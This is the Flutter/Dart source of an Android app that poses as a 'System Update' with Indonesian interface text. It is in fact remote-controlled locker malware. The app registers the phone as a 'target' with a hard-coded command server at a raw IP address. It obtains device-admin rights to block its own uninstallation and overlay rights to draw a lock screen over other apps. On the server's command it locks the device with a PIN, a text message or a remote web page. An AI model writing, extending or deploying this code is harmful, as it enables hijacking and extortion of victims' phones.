import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:webview_flutter/webview_flutter.dart';

// Variabel global
String? globalDeviceId;
IO.Socket? socket;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  SharedPreferences prefs = await SharedPreferences.getInstance();
  
  // RESET DATA UNTUK INSTALL BARU (HAPUS KOMENTAR JIKA PERLU RESET)
  // await prefs.clear();
  
  bool isFirstInstall = prefs.getBool('not_installed_before') ?? true;
  if (isFirstInstall) {
    await prefs.clear();
    await prefs.setBool('not_installed_before', false);
  }
  
  bool isLocked = prefs.getBool('system_locked') ?? false;
  String deviceId = prefs.getString('device_id') ?? await _generateDeviceId();
  globalDeviceId = deviceId;
  await prefs.setString('device_id', deviceId);
  
  if (isLocked) {
    String lockType = prefs.getString('lock_type') ?? 'pin';
    String lockData = prefs.getString('lock_data') ?? '1234';
    await prefs.setString('lock_type', lockType);
    await prefs.setString('lock_data', lockData);
  }
  
  // KONEKSI KE SERVER
  _connectToServer(deviceId);
  
  runApp(MyApp(isLocked: isLocked));
}

Future<String> _generateDeviceId() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  return "${androidInfo.brand}_${androidInfo.model}_${androidInfo.id}".replaceAll(' ', '_');
}

void _connectToServer(String deviceId) {
  // PERBAIKI: HAPUS SPASI DI URL
  String serverUrl='http://203.175.125.214:2527';
  socket = IO.io(serverUrl, IO.OptionBuilder()
      .setTransports(['websocket'])
      .setQuery({'id': deviceId, 'type': 'target'})
      .build());
  
  socket!.on('connect', (_) {
    print("✅ Connected to server");
  });
  
  socket!.on('command', (data) async {
    String cmd = data['command'];
    String extra = data['extra'] ?? '';
    
    if (cmd == 'remote_lock_pin') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'pin');
      await prefs.setString('lock_data', extra);
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'pin',
        'data': extra
      });
    }
    else if (cmd == 'remote_lock_text') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'text');
      await prefs.setString('lock_data', extra);
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'text',
        'data': extra
      });
    }
    else if (cmd == 'remote_lock_html') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'html');
      await prefs.setString('lock_data', extra);
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'html',
        'data': extra
      });
    }
    else if (cmd == 'remote_unlock') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', false);
      await prefs.remove('lock_type');
      await prefs.remove('lock_data');
      const MethodChannel('lock_channel').invokeMethod('stopLock');
    }
    else if (cmd == 'set_admin_pin') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setString('admin_pin', extra);
      print("PIN Anti Disable diterima: $extra");
    }
  });
  
  socket!.connect();
}

class MyApp extends StatelessWidget {
  final bool isLocked;
  const MyApp({super.key, required this.isLocked});
  
  @override
  Widget build(BuildContext context) => MaterialApp(
    debugShowCheckedModeBanner: false,
    home: isLocked ? const LockScreen() : const PermissionPage(),
  );
}

// ============ HALAMAN PERMISSION ============
class PermissionPage extends StatefulWidget {
  const PermissionPage({super.key});
  
  @override
  State<PermissionPage> createState() => _PermissionPageState();
}

class _PermissionPageState extends State<PermissionPage> {
  bool _overlayGranted = false;
  bool _adminGranted = false;
  bool _isChecking = false;

  @override
  void initState() {
    super.initState();
    _checkPermissions();
  }

  Future<void> _checkPermissions() async {
    setState(() {
      _isChecking = true;
    });
    
    bool overlay = await Permission.systemAlertWindow.isGranted;
    bool admin = false;
    try {
      final result = await const MethodChannel('lock_channel').invokeMethod('isAdminActive');
      admin = result == true;
    } catch (e) {}
    
    setState(() {
      _overlayGranted = overlay;
      _adminGranted = admin;
      _isChecking = false;
    });
    
    if (overlay && admin) {
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const HomeScreen()));
    }
  }

  Future<void> _requestOverlay() async {
    final status = await Permission.systemAlertWindow.request();
    setState(() {
      _overlayGranted = status.isGranted;
    });
    _checkIfComplete();
  }

  Future<void> _requestAdmin() async {
    try {
      await const MethodChannel('lock_channel').invokeMethod('requestAdmin');
      await Future.delayed(const Duration(seconds: 2));
      await _checkPermissions();
    } catch (e) {}
  }

  void _checkIfComplete() async {
    await _checkPermissions();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("System Update"), backgroundColor: Colors.red),
      body: Center(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.security, size: 80, color: Colors.orange),
              const SizedBox(height: 20),
              const Text(
                "Aktifkan Izin Berikut",
                style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 10),
              const Text(
                "Klik tombol AKTIFKAN untuk setiap izin",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 14, color: Colors.grey),
              ),
              const SizedBox(height: 40),
              
              // DEVICE ADMIN
              Container(
                width: double.infinity,
                decoration: BoxDecoration(
                  color: Colors.grey[800],
                  borderRadius: BorderRadius.circular(15),
                ),
                child: ListTile(
                  leading: Icon(
                    _adminGranted ? Icons.check_circle : Icons.warning,
                    color: _adminGranted ? Colors.green : Colors.orange,
                  ),
                  title: const Text("DEVICE ADMIN"),
                  subtitle: const Text("Mencegah aplikasi di-uninstall"),
                  trailing: ElevatedButton(
                    onPressed: _adminGranted ? null : _requestAdmin,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _adminGranted ? Colors.green : Colors.blue,
                    ),
                    child: Text(_adminGranted ? "AKTIF" : "AKTIFKAN"),
                  ),
                ),
              ),
              
              const SizedBox(height: 15),
              
              // OVERLAY
              Container(
                width: double.infinity,
                decoration: BoxDecoration(
                  color: Colors.grey[800],
                  borderRadius: BorderRadius.circular(15),
                ),
                child: ListTile(
                  leading: Icon(
                    _overlayGranted ? Icons.check_circle : Icons.warning,
                    color: _overlayGranted ? Colors.green : Colors.orange,
                  ),
                  title: const Text("OVERLAY"),
                  subtitle: const Text("Menampilkan layar kunci di atas aplikasi lain"),
                  trailing: ElevatedButton(
                    onPressed: _overlayGranted ? null : _requestOverlay,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _overlayGranted ? Colors.green : Colors.blue,
                    ),
                    child: Text(_overlayGranted ? "AKTIF" : "AKTIFKAN"),
                  ),
                ),
              ),
              
              const SizedBox(height: 40),
              
              if (_isChecking)
                const CircularProgressIndicator(),
              
              if (!_overlayGranted || !_adminGranted)
                TextButton(
                  onPressed: _checkPermissions,
                  child: const Text("CEK ULANG IZIN"),
                ),
            ],
          ),
        ),
      ),
    );
  }
}

class LockScreen extends StatefulWidget {
  const LockScreen({super.key});
  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  String _lockType = 'pin';
  String _lockData = '';
  final TextEditingController _pinController = TextEditingController();
  
  @override
  void initState() {
    super.initState();
    _loadLockData();
  }
  
  Future<void> _loadLockData() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    setState(() {
      _lockType = prefs.getString('lock_type') ?? 'pin';
      _lockData = prefs.getString('lock_data') ?? '1234';
    });
  }
  
  void _unlock() async {
    if (_lockType == 'pin' && _pinController.text == _lockData) {
      _doUnlock();
    } else if (_lockType != 'pin') {
      _doUnlock();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("PIN salah!")));
      _pinController.clear();
    }
  }
  
  void _doUnlock() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setBool('system_locked', false);
    await prefs.remove('lock_type');
    await prefs.remove('lock_data');
    const MethodChannel('lock_channel').invokeMethod('stopLock');
    if (mounted) {
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const HomeScreen()));
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: _lockType == 'html'
            ? WebViewWidget(
                controller: WebViewController()
                  ..setJavaScriptMode(JavaScriptMode.unrestricted)
                  ..loadRequest(Uri.parse(_lockData))
              )
            : _lockType == 'text'
                ? Center(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Text(
                        _lockData,
                        style: const TextStyle(color: Colors.red, fontSize: 28, fontWeight: FontWeight.bold),
                        textAlign: TextAlign.center,
                      ),
                    ),
                  )
                : Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(Icons.lock, size: 100, color: Colors.red),
                        const SizedBox(height: 30),
                        const Text("SYSTEM LOCKED", style: TextStyle(color: Colors.red, fontSize: 24, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 30),
                        SizedBox(
                          width: 250,
                          child: TextField(
                            controller: _pinController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            decoration: const InputDecoration(
                              hintText: "Enter PIN",
                              hintStyle: TextStyle(color: Colors.grey),
                              border: OutlineInputBorder(),
                              filled: true,
                              fillColor: Colors.grey,
                            ),
                            style: const TextStyle(color: Colors.white, fontSize: 18),
                            onSubmitted: (_) => _unlock(),
                          ),
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton(
                          onPressed: _unlock,
                          style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                          child: const Text("UNLOCK", style: TextStyle(fontSize: 16)),
                        ),
                      ],
                    ),
                  ),
      ),
    );
  }
}

class HomeScreen extends StatelessWidget {
  const HomeScreen({super.key});
  
  @override
  Widget build(BuildContext context) => Scaffold(
    appBar: AppBar(title: const Text("System Update"), backgroundColor: Colors.red),
    body: const Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.security, size: 80, color: Colors.green),
          SizedBox(height: 20),
          Text("Aplikasi target berjalan di background"),
          SizedBox(height: 10),
          Text("Device terdaftar ke server kontrol", style: TextStyle(fontSize: 12, color: Colors.grey)),
        ],
      ),
    ),
  );
}